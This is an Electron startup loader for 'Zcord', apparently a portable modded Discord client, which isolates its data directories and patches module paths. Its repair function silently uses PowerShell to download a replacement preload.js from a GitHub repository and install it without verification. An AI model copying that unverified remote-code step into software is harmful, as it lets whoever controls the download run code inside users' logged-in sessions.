"use strict";
/**
 * Zcord portable host loader — isolation totale du Discord système.
 * Toutes les données vont dans <exeDir>/Data (pas %APPDATA%\discord).
 */
const path = require("path");
const fs = require("fs");
const Module = require("module");
const { app } = require("electron");

const exeDir = path.dirname(process.execPath);
const zcordData = path.join(exeDir, "Data");
const zcordRoaming = path.join(zcordData, "Roaming");
const zcordLocal = path.join(zcordData, "Local");
const zcordSession = path.join(zcordData, "sessionData");

for (const d of [zcordData, zcordRoaming, zcordLocal, zcordSession]) {
    try { fs.mkdirSync(d, { recursive: true }); } catch (_) {}
}

// MAJ ZIP en attente (avant patcher — pas de SmartScreen)
(() => {
    const markerPath = path.join(zcordData, "zcord-pending-update.json");
    if (!fs.existsSync(markerPath)) return;
    let marker;
    try { marker = JSON.parse(fs.readFileSync(markerPath, "utf8")); } catch (_) {
        try { fs.rmSync(markerPath, { force: true }); } catch (__) {}
        return;
    }
    const { stagingDir, destDir } = marker;
    if (!stagingDir || !destDir || !fs.existsSync(stagingDir)) {
        try { fs.rmSync(markerPath, { force: true }); } catch (_) {}
        return;
    }
    const skip = new Set(["Data", "ZcordData", "Zcord"]);
    function mergeDir(src, dest) {
        fs.mkdirSync(dest, { recursive: true });
        for (const ent of fs.readdirSync(src, { withFileTypes: true })) {
            if (skip.has(ent.name)) continue;
            const s = path.join(src, ent.name);
            const d = path.join(dest, ent.name);
            if (ent.isDirectory()) mergeDir(s, d);
            else {
                try { fs.copyFileSync(s, d); } catch (e) {
                    console.warn("[Zcord] MAJ skip:", s, e?.message);
                }
            }
        }
    }
    console.log("[Zcord] Application MAJ", stagingDir, "→", destDir);
    try { mergeDir(stagingDir, destDir); } catch (e) {
        console.error("[Zcord] MAJ echouee:", e?.message);
    }
    try { fs.rmSync(markerPath, { force: true }); } catch (_) {}
    try { fs.rmSync(stagingDir, { recursive: true, force: true }); } catch (_) {}
})();

// Discord ne doit jamais toucher le Discord installé / AppData système.
process.env.APPDATA = zcordRoaming;
process.env.LOCALAPPDATA = zcordLocal;
process.env.ZCORD_DISCORD_HOST = "1";
process.env.DISCORD_USER_DATA_DIR = zcordData;

(() => {
    const modulesRoot = path.join(exeDir, "modules");
    if (!fs.existsSync(modulesRoot)) return;

    const extra = [];
    const installed = {};
    let version = "1.0.9252";
    try {
        const bi = JSON.parse(fs.readFileSync(path.join(exeDir, "resources", "build_info.json"), "utf8"));
        if (bi.version) version = bi.version;
    } catch (_) {}

    const localModules = path.join(zcordRoaming, "discord", version, "modules");
    try { fs.mkdirSync(localModules, { recursive: true }); } catch (_) {}

    function linkOrCopy(target, linkPath) {
        try {
            if (fs.existsSync(linkPath)) {
                const st = fs.lstatSync(linkPath);
                if (st.isSymbolicLink() || st.isDirectory()) return;
            }
            fs.mkdirSync(path.dirname(linkPath), { recursive: true });
            fs.symlinkSync(target, linkPath, "junction");
        } catch (_) {
            try {
                if (fs.existsSync(linkPath)) fs.rmSync(linkPath, { recursive: true, force: true });
                fs.cpSync(target, linkPath, { recursive: true });
            } catch (__) {}
        }
    }

    function writeInstalledJson() {
        if (!Object.keys(installed).length) return;
        try {
            const p = path.join(localModules, "installed.json");
            for (const k of Object.keys(installed)) {
                const v = installed[k]?.installedVersion;
                if (v === undefined || v === null) installed[k] = { installedVersion: 0 };
            }
            fs.writeFileSync(p, JSON.stringify(installed, null, 2));
        } catch (_) {}
    }

    for (const ent of fs.readdirSync(modulesRoot)) {
        const full = path.join(modulesRoot, ent);
        try {
            if (!fs.statSync(full).isDirectory()) continue;
        } catch (_) { continue; }
        extra.push(full);

        const m = ent.match(/^(discord_.+)-(\d+)$/);
        if (!m) continue;
        const [, modName, modVer] = m;
        const ver = Number(modVer) || 0;
        installed[modName] = { installedVersion: ver };
        linkOrCopy(full, path.join(localModules, `${modName}-0`));
        linkOrCopy(full, path.join(localModules, `${modName}-${ver}`));
    }

    writeInstalledJson();

    try { fs.rmSync(path.join(localModules, "pending"), { recursive: true, force: true }); } catch (_) {}

    if (!extra.length) return;
    const prevPath = process.env.NODE_PATH ? process.env.NODE_PATH.split(path.delimiter).filter(Boolean) : [];
    process.env.NODE_PATH = [...extra, ...prevPath].join(path.delimiter);
    Module._initPaths();
})();

const origSetPath = app.setPath.bind(app);
origSetPath("userData", zcordData);
origSetPath("sessionData", zcordSession);
try { origSetPath("appData", zcordRoaming); } catch (_) {}
try { origSetPath("userCache", path.join(zcordLocal, "Zcord")); } catch (_) {}

app.setPath = (name, p) => {
    if (name === "userData") return origSetPath("userData", zcordData);
    if (name === "sessionData") return origSetPath("sessionData", zcordSession);
    if (name === "appData") return origSetPath("appData", zcordRoaming);
    return origSetPath(name, p);
};

const ZCORD_AUMID = "com.zcord.portable";

const origSetAumid = app.setAppUserModelId.bind(app);
app.setAppUserModelId = (id) => {
    // Discord force souvent com.squirrel.Discord.* → barre des tâches = icône Discord
    return origSetAumid(ZCORD_AUMID);
};
origSetAumid(ZCORD_AUMID);
try { app.setName("Zcord"); } catch (_) {}

const gotLock = app.requestSingleInstanceLock();
if (!gotLock) {
    app.exit(0);
} else {
    app.on("second-instance", () => {
        const { BrowserWindow } = require("electron");
        const wins = BrowserWindow.getAllWindows();
        const w = wins.find(x => x.isVisible()) || wins[0];
        if (w) {
            if (w.isMinimized()) w.restore();
            w.focus();
        }
    });
}

/** preload.js legacy (aout 2025) = pas d'injection Zcord / Plugins */
function repairLegacyPreload() {
    const desktopDir = path.join(__dirname, "dist", "desktop");
    const preloadPath = path.join(desktopDir, "preload.js");
    const refPath = path.join(desktopDir, "preload.ref.js");

    if (!fs.existsSync(preloadPath)) return;

    const body = fs.readFileSync(preloadPath, "utf8");
    const isLegacy = body.includes("Equicord avec contextBridge")
        || (body.includes("Zcord preload") && !body.includes("//# sourceURL=file:///VencordPreload"));

    if (!isLegacy) return;

    console.warn("[Zcord] preload.js obsolete — reparation...");

    if (fs.existsSync(refPath)) {
        try {
            fs.copyFileSync(refPath, preloadPath);
            console.log("[Zcord] preload.js repare (preload.ref.js)");
            return;
        } catch (e) {
            console.warn("[Zcord] preload.ref.js echoue:", e?.message);
        }
    }

    const url = "https://github.com/devdee162-web/qsddddddddddddddddddddddddsq/releases/latest/download/f_resources__app__dist__desktop__preload.js";
    const tmp = path.join(require("os").tmpdir(), `zcord-preload-${Date.now()}.js`);
    try {
        const { execSync } = require("child_process");
        execSync(
            `powershell -NoProfile -Command "Invoke-WebRequest -Uri '${url}' -OutFile '${tmp.replace(/'/g, "''")}' -UseBasicParsing"`,
            { stdio: "pipe", timeout: 120000 }
        );
        if (fs.existsSync(tmp) && fs.statSync(tmp).size > 1000) {
            fs.copyFileSync(tmp, preloadPath);
            try { fs.copyFileSync(tmp, refPath); } catch (_) {}
            console.log("[Zcord] preload.js repare (GitHub latest)");
        }
    } catch (e) {
        console.error("[Zcord] Reparation preload impossible:", e?.message);
    } finally {
        try { fs.rmSync(tmp, { force: true }); } catch (_) {}
    }
}

repairLegacyPreload();

require(path.join(__dirname, "dist", "desktop", "patcher.js"));
